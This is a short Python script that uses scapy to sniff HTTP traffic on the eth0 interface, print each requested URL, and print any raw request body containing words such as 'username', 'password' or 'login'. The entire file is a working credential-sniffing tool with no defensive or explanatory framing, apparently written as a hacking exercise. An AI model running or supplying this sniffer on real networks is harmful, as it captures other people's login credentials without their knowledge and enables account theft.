#!/usr/bin/python 

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
	scapy.sniff(iface=interface, store=False, prn=process_sniffied_packet)

def process_sniffied_packet(packet):
	if packet.haslayer(http.HTTPRequest): 
		#print(packet.show())
		url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
		print(url)

		if packet.haslayer(scapy.Raw): 
			load = packet[scapy.Raw].load.decode()  
			keywords = ["username", "password", "user", "login", "uname", "pass"]
			for keyword in keywords:
				keyword = keyword
				if keyword in load:
					print(load) 
					break

sniff("eth0")